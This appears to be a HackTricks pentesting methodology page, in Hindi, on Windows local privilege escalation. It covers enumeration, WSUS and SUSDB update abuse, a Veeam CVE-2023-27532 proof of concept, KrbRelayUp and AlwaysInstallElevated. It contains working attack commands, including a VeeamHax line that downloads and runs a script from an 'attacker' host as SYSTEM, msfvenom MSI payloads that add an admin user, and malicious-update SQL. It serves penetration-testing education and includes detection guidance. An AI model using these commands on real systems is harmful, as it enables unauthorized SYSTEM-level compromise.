# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

यह पेज कई बुनियादी guides से सामान्य Windows privilege-escalation methodology को एक जगह समेटता है।<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> इसका व्यावहारिक enumeration flow community workshops और checklists से भी लिया गया है।<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> ऐतिहासिक attack सामग्री में Windows privilege escalation पर DerbyCon presentation शामिल है।<sup>[[5]](#references)</sup>

## शुरुआती Windows सिद्धांत

### Access Tokens

**अगर आपको नहीं पता कि Windows access tokens क्या होते हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए यह पेज देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**अगर आपको नहीं पता कि Windows में integrity levels क्या होते हैं, तो आगे बढ़ने से पहले यह पेज पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में कई चीज़ें **आपको system enumerate करने से रोक सकती हैं**, executables चलाने से रोक सकती हैं, या आपकी गतिविधियों का **पता लगा सकती हैं**। Privilege escalation enumeration शुरू करने से पहले, आपको यह **पेज पढ़ना चाहिए** और इन सभी **defense mechanisms** को **enumerate करना चाहिए**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physical access से offline UEFI NVRAM edit को pre-boot DMA और Windows `SYSTEM` memory-patching chain में भी बदला जा सकता है:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` के ज़रिए launch किए गए UIAccess processes का दुरुपयोग करके, AppInfo के secure-path checks को bypass करने पर prompts के बिना High IL हासिल किया जा सकता है। UIAccess/Admin Protection bypass के लिए यह dedicated workflow देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

हाल के Windows builds में **SMB arbitrary-port** LPE path भी जोड़ा गया है, जिसमें privileged local NTLM authentication को reused SMB TCP connection के ज़रिए reflect किया जाता है:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि Windows version में कोई ज्ञात vulnerability है या नहीं (लागू किए गए patches भी जाँचें)।

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Version Exploits

Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए यह [site](https://msrc.microsoft.com/update-guide/vulnerability) उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो दिखाती हैं कि Windows environment कितना **विशाल attack surface** प्रस्तुत करता है।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson शामिल है)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — OS build, installed updates और संभावित advisory candidates की सूची बनाता है; किसी result को लागू मानने से पहले exact product और superseding updates की पुष्टि करें।

किसी version-specific local exploit के लिए, OS architecture के साथ-साथ **चल रहे process की architecture** भी जाँचें। 64-bit Windows पर, 32-bit process पर [WOW64 file-system redirection](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector) लागू होता है: `%windir%\System32` आमतौर पर 32-bit system directory पर resolve होता है, जबकि `%windir%\Sysnative` उस process को native system directory तक पहुँच देता है। यह alias 64-bit process के लिए उपलब्ध नहीं है। OS build या missing-KB candidate से exploitability साबित नहीं होती; exact issue के लिए [Microsoft security bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) के साथ running build, installed या superseding update, process architecture और exploit prerequisites की तुलना करें।

**सिस्टम की जानकारी का इस्तेमाल करके स्थानीय रूप से**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits के Github repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या env variables में कोई credentials/Juicy info saved है?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell इतिहास

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell ट्रांसक्रिप्ट फ़ाइलें

आप [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) में इसे चालू करने का तरीका जान सकते हैं.

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` केवल एक उदाहरण है। [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) आम तौर पर प्रत्येक उपयोगकर्ता के Documents फ़ोल्डर में लिखती है, लेकिन `OutputDirectory` सेटिंग या `Start-Transcript -OutputDirectory` फ़ाइलों को किसी साझा या छिपे हुए फ़ोल्डर में भेज सकती है। किसी transcript की समीक्षा करने से पहले प्रभावी output path और फ़ाइल ACL जाँचें: उसमें command arguments और output हो सकते हैं, जिनमें credentials भी शामिल हैं। पढ़ा जा सकने वाला transcript तभी उपयोगी संकेत है, जब उसकी सामग्री किसी ऐसे उच्च-विशेषाधिकार वाले identity का खुलासा करे जिसका उपयोग किया जा सके और वह identity संबंधित संदर्भ में log on कर सके।

### PowerShell Module Logging

PowerShell pipeline के निष्पादन का विवरण दर्ज किया जाता है, जिसमें निष्पादित commands, command invocations और scripts के कुछ हिस्से शामिल हैं। हालाँकि, निष्पादन का पूरा विवरण और output के परिणाम शायद दर्ज न हों।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" अनुभाग में दिए गए निर्देशों का पालन करें और **"Powershell Transcription"** के बजाय **"Module Logging"** चुनें।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

PowerShell लॉग्स से पिछले 15 इवेंट देखने के लिए, आप यह चला सकते हैं:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और संपूर्ण सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे कोड के हर ब्लॉक को चलते समय दस्तावेज़ित किया जाता है। यह प्रक्रिया हर गतिविधि का व्यापक ऑडिट ट्रेल सुरक्षित रखती है, जो फॉरेंसिक जाँच और दुर्भावनापूर्ण व्यवहार का विश्लेषण करने के लिए उपयोगी है। निष्पादन के समय सभी गतिविधियों को दस्तावेज़ित करके, प्रक्रिया की विस्तृत जानकारी प्रदान की जाती है।

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Script Block के लिए logging events Windows Event Viewer में इस path पर मिल सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**।\
पिछले 20 events देखने के लिए आप यह इस्तेमाल कर सकते हैं:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### इंटरनेट सेटिंग्स

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### ड्राइव्स

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

पहले दिए गए मार्गदर्शन में जोखिम का सार इस प्रकार बताया गया था:

अगर updates को http**S** के बजाय http का उपयोग करके अनुरोध किया जाता है, तो आप system को compromise कर सकते हैं।

HTTP WSUS endpoint, update-metadata interception की जांच का संकेत है। Exploitation इस बात पर भी निर्भर करता है कि client उस WSUS server का उपयोग करता है या नहीं, attacker उसके traffic को intercept या control कर सकता है या नहीं, और client की update trust तथा installation policy क्या है। केवल URL से code execution साबित नहीं होता। [Microsoft WSUS metadata के लिए TLS की सिफारिश करता है](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

आप cmd में यह चलाकर जांचना शुरू करते हैं कि network किसी non-SSL WSUS update का उपयोग करता है या नहीं:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

या PowerShell में निम्नलिखित:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

अगर आपको इनमें से कोई जवाब मिलता है:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` का मान `1` है।

मूल लागू होने का कथन यह था:

तब, **इसका exploit किया जा सकता है।** यदि अंतिम registry का मान `0` है, तो WSUS entry को अनदेखा किया जाएगा।

जब `UseWUServer` का मान `1` होता है, तो Windows Update कॉन्फ़िगर की गई intranet service का उपयोग करता है। यह HTTP interception path के लिए एक पूर्वापेक्षा की पुष्टि करता है, लेकिन यह साबित नहीं करता कि interception, malicious update की स्वीकृति या elevated installation संभव है। जब इसका मान `0` होता है, तो इस policy द्वारा कॉन्फ़िगर किया गया यह WSUS endpoint चुना नहीं जाता।

इन vulnerabilities का exploit करने के लिए आप [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) जैसे tools का उपयोग कर सकते हैं—ये non-SSL WSUS traffic में 'नकली' updates inject करने के लिए MiTM weaponized exploit scripts हैं।

यहाँ research पढ़ें:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**पूरी report यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
मूलतः, यह वह flaw है जिसका यह bug exploit करता है:

> यदि हमारे पास अपने local user proxy को modify करने की अनुमति है, और Windows Updates Internet Explorer की settings में कॉन्फ़िगर किए गए proxy का उपयोग करता है, तो हमारे पास अपने asset पर locally [PyWSUS](https://github.com/GoSecure/pywsus) चलाकर अपना traffic intercept करने और elevated user के रूप में code चलाने की क्षमता है।
>
> इसके अलावा, चूँकि WSUS service वर्तमान user की settings का उपयोग करती है, इसलिए यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए self-signed certificate बनाकर इस certificate को वर्तमान user के certificate store में जोड़ दें, तो हम HTTP और HTTPS, दोनों WSUS traffic को intercept कर पाएँगे। WSUS, certificate पर trust-on-first-use प्रकार का validation लागू करने के लिए HSTS-जैसे किसी mechanism का उपयोग नहीं करता। यदि प्रस्तुत certificate user द्वारा trusted है और उसका hostname सही है, तो service उसे स्वीकार कर लेगी।

आप इस vulnerability को [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool का उपयोग करके exploit कर सकते हैं (जब यह उपलब्ध कराया जाए)।

### WSUS administrator द्वारा नियंत्रित updates

एक अलग path तब मौजूद होता है जब वर्तमान identity के पास WSUS server पर updates **publish और approve** करने की अनुमति हो। Server के `WSUS Administrators` group की प्रभावी membership और किसी भी delegated WSUS permissions की जाँच करें, फिर उस client computer group की पहचान करें जिसे approved update मिलेगा। [Microsoft updates approve करने के लिए WSUS Administrator privileges आवश्यक बताता है](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), और [publishing trust relationship का दस्तावेज़ देता है](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): clients को locally published content के लिए इस्तेमाल किए गए signing certificate पर trust करना होगा। इसे escalation path मानने से पहले पुष्टि करें कि candidate update signed और accepted है, target पर लागू होता है, और अधिक privileged context में install होता है। केवल HTTP `WUServer` value या group name से इन शर्तों की पुष्टि नहीं होती।

### SUSDB custom-update का दुरुपयोग: `.txt`/`.esd` के ज़रिए unsigned payloads

यह HTTP WSUS connection को intercept करने से अलग trust-boundary failure है: इसके लिए **WSUS database (`SUSDB`) stored procedures** तक इतनी access चाहिए कि custom update publish और approve किया जा सके। एक व्यावहारिक entry path में upstream WSUS computer account को एक अलग MSSQL server पर relay करना शामिल है, जहाँ `SUSDB` host किया गया हो; सटीक पूर्वापेक्षा deployment पर निर्भर करती है, इसलिए SQL administrator rights मानने के बजाय पहले `EXECUTE` permissions enumerate करें।<sup>[[38]](#references)[[39]](#references)</sup>

HTTP/8530 से LDAP, SMB या AD CS तक WSUS client authentication relay करने वाले अलग attack path के लिए, [WSUS HTTP का NTLM relay के लिए दुरुपयोग](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) देखें।

#### External-database relay और procedure permissions की पुष्टि करें

जिन deployments में WSUS external SQL Server का उपयोग करता है, वहाँ पहले जाँचें कि WSUS server account database पर authenticate कर सकता है या नहीं, और NTLM relay उस listener तक पहुँचता है या नहीं। Server की SQL role, update-publishing procedures तक access दे सकती है, भले ही direct table writes अस्वीकृत हों; `SUSDB` पर `UPDATE` विफल होने से यह साबित नहीं होता कि publishing अवरुद्ध है। Custom update आज़माने से पहले, अधिकृत SQL session में effective identity, role membership और procedure permissions की जाँच करें।<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

वर्तमान procedure definitions और इंस्टॉल किया गया `SoftwareDistributionPackage.xsd`, वैध update metadata को फिर से बनाने में उपयोगी हैं। Bundle parent और payload child—दोनों को `UpdateIdentity` (fragment type `1`), `LocalizedProperties` (`4`) और `ExtendedProperties` (`2`) की ज़रूरत होती है; हर `spImportUpdate` call से मिलने वाली local revision ID को दर्ज करें और bundle relationship, digests, size, content URL और revision को सुसंगत रखें। यह stateful publishing workflow है, इसलिए stored procedure की एक सफल call इस बात का प्रमाण नहीं है कि client-side execution हुआ है।<sup>[[38]](#references)</sup>

#### Update बनाएं, लक्षित करें और approve करें

Custom-update workflow, वैध WSUS procedures को एक restricted publishing API के रूप में इस्तेमाल करता है। महत्वपूर्ण state transitions ये हैं:<sup>[[38]](#references)</sup>

| चरण | संबंधित stored procedures |
| --- | --- |
| Update metadata import करें | `spImportUpdate` |
| Prerequisite, localized और extended XML fragments स्टोर करें | `spSaveXMLFragment` |
| Content digest को attacker-controlled URL से जोड़ें | `spSetBatchURL` |
| Computer group की सूची बनाएं/बनाएं और client को उसमें जोड़ें | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| उस group के लिए installation approve करें | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

Imported metadata/fragments में file name, digests, size और `CommandLineInstallation` handler मेल खाने चाहिए। Content URL और target group असाइन करने के बाद, अंतिम approval इस तरह दिखता है; उदाहरण के GUIDs को दोबारा इस्तेमाल करने के बजाय नए update, group और deployment identifiers इस्तेमाल करें।<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Extension-driven signature bypass

WSUS सामान्यतः मनमाने unsigned executable content को अस्वीकार करता है। हालांकि, `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` में .NET का `VerifyFile` path, दिए गए filename के `.txt` या `.esd` से समाप्त होने पर certificate-check flag को false कर देता है; `CheckCertificateSignature` को यह साबित किए बिना छोड़ दिया जाता है कि bytes वास्तव में text हैं या वैध ESD image। इसलिए `payload.exe.txt` नाम वाला अपरिवर्तित PE content verification पास कर सकता है और बाद में update के command-line installation handler द्वारा launch किया जा सकता है। यह policy/type-confusion bug है, signature forgery नहीं।<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-अनुकूल staging और automation

`spDeployUpdate` को कॉल करने से WSUS पंजीकृत content fetch करता है। Origin को BITS की HTTP अपेक्षाएँ पूरी करनी होंगी: केवल ऐसा URL होना जिस तक पहुँचा जा सके, पर्याप्त नहीं है, क्योंकि transfer में शुरुआती `HEAD`/`GET` flow और byte-range requests का उपयोग होता है। Range support के बिना server होने पर WSUS synchronization में `EventId=364` आता है, जिसमें बताया जाता है कि BITS को Range protocol header चाहिए।<sup>[[39]](#references)</sup>

रिसर्च PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) import/fragment/URL/group/deployment chain के लिए आवश्यक SQL generate करता है, उसे execute करने के लिए modified MSSQL client शामिल करता है, और content staging के लिए `BitsWebServer.py` देता है। अधिकृत lab में इसका न्यूनतम invocation है:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### बिना निगरानी निष्पादन और retry persistence

Client-side interaction नीति पर निर्भर करता है। `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` में विकल्प `4 - Auto download and schedule install` सक्षम करने से स्वीकृत update, उपयोगकर्ता द्वारा उसे मैन्युअल रूप से चुने बिना, कॉन्फ़िगर किए गए शेड्यूल के अनुसार डाउनलोड और इंस्टॉल होता है। परीक्षण में, callback process के exit होने के तुरंत बाद ऐसा payload जिसका update विफल/अधूरा रहा, फिर से पेश किया गया। इसलिए retry व्यवहार बार-बार होने वाली execution persistence बन सकता है; यह आसानी से दिख जाता है, क्योंकि client update-failed स्थिति दिखाता है।<sup>[[39]](#references)</sup>

#### Detection और hardening के संकेत

इस chain से जुड़े उपयोगी server- और client-side संकेत हैं:<sup>[[39]](#references)</sup>

- `SUSDB` में `spCreateTargetGroup`, `spSetBatchURL` और `spDeployUpdate` के निष्पादन का audit करें; नए targeting groups, बाहरी content origins, `.txt`/`.esd` update payloads और अप्रत्याशित principals (विशेषकर non-computer accounts) द्वारा किए गए deployments की जाँच करें।
- `C:\Program Files\Update Services\LogFiles` में `ContentSyncAgent`, `FileVerified`, गलत वर्तनी वाला `FileVerficationFailed` और `EventId=364` खोजें; verification को payload extension और content magic से मिलाकर देखें, केवल suffix पर भरोसा न करें।
- बार-बार विफल/retry होने वाले Windows Update installation की तलाश करें; साथ ही `.txt` या `.esd` नाम वाले content से PE execution या अप्रत्याशित child/network activity भी खोजें।
- जहाँ समर्थित हो, database service पर Extended Protection for Authentication अनिवार्य करें और database network access को WSUS server तथा अधिकृत administrative systems तक सीमित रखें। Custom-update procedures पर `EXECUTE` अधिकार न्यूनतम रखें और उनका audit करें।

## Third-Party Auto-Updaters और Agent IPC (local privesc)

कई enterprise agents localhost IPC surface और privileged update channel उपलब्ध कराते हैं। यदि enrollment को attacker server की ओर मोड़ा जा सकता है और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करता है, तो local user एक malicious MSI भेज सकता है, जिसे SYSTEM service इंस्टॉल कर देती है। सामान्यीकृत technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 के ज़रिए SYSTEM)

मूल version-specific विवरण और reconnaissance नोट यह थे:

Veeam B&R < `11.0.1.1261` **TCP/9401** पर localhost service उपलब्ध कराता है, जो attacker-controlled messages को process करती है और **NT AUTHORITY\SYSTEM** के रूप में arbitrary commands चलाने देती है।<sup>[[12]](#references)</sup>

- **Recon**: listener और version की पुष्टि करें, उदाहरण के लिए `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`।

Veeam Backup & Replication और Cloud Connect, डिफ़ॉल्ट रूप से **TCP/9401** पर core backup service का उपयोग करते हैं। [Veeam की advisory](https://www.veeam.com/kb4424) backup network perimeter के भीतर encrypted configuration-database credentials के unauthenticated disclosure का वर्णन करती है; एक अलग सार्वजनिक PoC **NT AUTHORITY\SYSTEM** के रूप में command-execution path दिखाता है।<sup>[[12]](#references)</sup> Service localhost से आगे भी bind हो सकती है, इसलिए उसका वास्तविक address और PID जाँचें।

- **Recon**: पुष्टि करें कि TCP/9401 `Veeam.Backup.Service.exe` से जुड़ा है, फिर इंस्टॉल किए गए product और patch metadata की जाँच करें। `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` संकेत हैं, patch की पूरी जाँच नहीं।
- **Fixed floors**: Veeam **11a build 11.0.1.1261 P20230227** और **12 build 12.0.0.1420 P20230223** को पहले fixed releases के रूप में सूचीबद्ध करता है; इससे पुराने releases प्रभावित हैं। केवल चार भागों वाला file version, उन्हीं build numbers पर मौजूद unpatched base build और बाद के patch में अंतर नहीं बता सकता। किसी boundary build को fixed मानने से पहले patch identifier को [vendor build history](https://www.veeam.com/kb2680) से सत्यापित करें।
- **Exploit**: आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसे PoC को उसी directory में रखें, फिर local socket पर SYSTEM payload trigger करें:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

यह service command को SYSTEM के रूप में execute करती है।

उद्धृत PoC दिखाता है कि अतिरिक्त prerequisites पूरी होने पर command SYSTEM के रूप में execute हो सकती है; vendor की advisory credential-disclosure issue का वर्णन करती है।

## KrbRelayUp

मूल default-environment विवरण यह था:

विशिष्ट परिस्थितियों में Windows **domain** environments में **local privilege escalation** की vulnerability मौजूद होती है। इन परिस्थितियों में ऐसे environments शामिल हैं जहाँ **LDAP signing लागू नहीं है,** users के पास ऐसे self-rights हैं जिनसे वे **Resource-Based Constrained Delegation (RBCD)** configure कर सकते हैं, और users domain में computer बनाने में सक्षम हैं। ध्यान दें कि ये **requirements** **default settings** के अंतर्गत पूरी होती हैं।

एक local Kerberos relay, कम privileges वाले logon से privileged directory write तक पहुँच सकता है, जब कोई उपयुक्त COM server authenticate करता है और relayed principal के पास target object पर अधिकार होते हैं। [KrbRelay दस्तावेज़](https://github.com/cube0x0/KrbRelay) RBCD और `msDS-KeyCredentialLink` (shadow-credential) LDAP writes, दोनों का वर्णन करते हैं; KrbRelayUp इनमें से कुछ paths को automate करता है। RBCD chain के लिए लागू delegation और target-object rights आवश्यक हैं, जबकि shadow-credential chain के लिए key-credential write rights और certificate authentication path को support करने वाला KDC आवश्यक है। इनमें से कोई भी path केवल domain membership से नहीं मिलता।

वास्तविक DC की [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) और [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) policy, relayed identity के object ACL, और चुनी गई COM class के authentication तथा impersonation levels की जाँच करें। Caller का logon type और credential context भी महत्वपूर्ण है: WinRM session का व्यवहार interactive या new-credentials logon से अलग हो सकता है। Firewall/OXID routing और installed updates भी परिणाम बदल सकते हैं। Permissive policy या मेल खाता ACL मिलने पर उसे review के लिए candidate मानें; passive enumeration से COM coercion, relay authentication या directory writes शुरू नहीं होने चाहिए। Machine-account shadow credential से machine ticket मिल सकता है और, केवल तभी जब उस account के पास आवश्यक directory replication rights हों, एक अलग DCSync path भी मिल सकता है।

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) में **exploit खोजें**

Attack के flow की अधिक जानकारी के लिए [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> देखें।

## AlwaysInstallElevated

**यदि** ये 2 registers **enabled** हैं (value **0x1** है), तो किसी भी privilege वाले users `*.msi` files को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

यदि आपके पास meterpreter session है, तो आप इस technique को **`exploit/windows/local/always_install_elevated`** module का उपयोग करके automate कर सकते हैं।

### PowerUP

privileges escalate करने के लिए, वर्तमान directory में Windows MSI binary बनाने हेतु power-up का `Write-UserAddMSI` command इस्तेमाल करें। यह script एक precompiled MSI installer लिखती है, जो user/group जोड़ने का prompt देता है (इसलिए आपको GIU access की आवश्यकता होगी):

```
Write-UserAddMSI
```

बनाई गई binary को privileges बढ़ाने के लिए बस execute करें।

### MSI Wrapper

इस tool का उपयोग करके MSI wrapper बनाने का तरीका जानने के लिए यह tutorial पढ़ें। ध्यान दें कि अगर आप **सिर्फ** **command lines** **execute** करना चाहते हैं, तो आप "**.bat**" file को wrap कर सकते हैं।

{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाएं


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाएं

- Cobalt Strike या Metasploit से एक नया Windows EXE TCP payload बनाएं और उसे `C:\privesc\beacon.exe` में रखें।
